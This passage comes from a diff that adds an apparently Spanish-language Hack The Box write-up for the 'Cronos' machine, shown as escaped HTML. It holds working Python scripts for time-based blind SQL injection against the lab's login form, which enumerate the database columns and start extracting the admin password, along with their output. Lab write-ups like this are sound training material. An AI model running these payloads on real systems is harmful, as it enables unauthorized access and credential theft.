+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 database_tables.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload: Fin del payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Table[0]: &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Table[1]:  
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Table[2]: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el nombre de la única tabla que es &lt;strong&gt;users&lt;/strong&gt;. Ahora necesitamos conocer los nombres de las columnas que conforman dicha tabla.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#codgin: utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Variables globales
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://admin.cronos.htb/index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'0123456789abcdefghijklmnopqrstuvwxyz'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'loquesea'&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generando el payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Column[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;' or if(substr((select column_name from information_schema.columns where table_name='users' limit &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,1),&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,1)='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c',sleep(3),1)-- -&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Probando con: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fin del payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 database_columns.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload: Fin del payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Column[0]: &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Column[1]: username
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Column[2]: password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que la tabla &lt;strong&gt;users&lt;/strong&gt; tiene las columnas &lt;strong&gt;id&lt;/strong&gt;, &lt;strong&gt;username&lt;/strong&gt; y &lt;strong&gt;password&lt;/strong&gt;; por lo que nos queda listar los datos que contiene la tabla. Para ir un poco más rapidos, vamos a hacer la inyección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin' and sleep(5)-- -&lt;/code&gt; para validar si el usuario &lt;strong&gt;admin&lt;/strong&gt; existe a en la base de datos y tenemos que el servidor nos tarda 5 segundos en responder; por lo tanto, ya tenemos el usuario, ahora solo nos falta obtener la contraseña:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#codgin: utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Variables globales
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://admin.cronos.htb/index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'0123456789abcdefghijklmnopqrstuvwxyz'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'loquesea'&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generando el payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password [admin]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
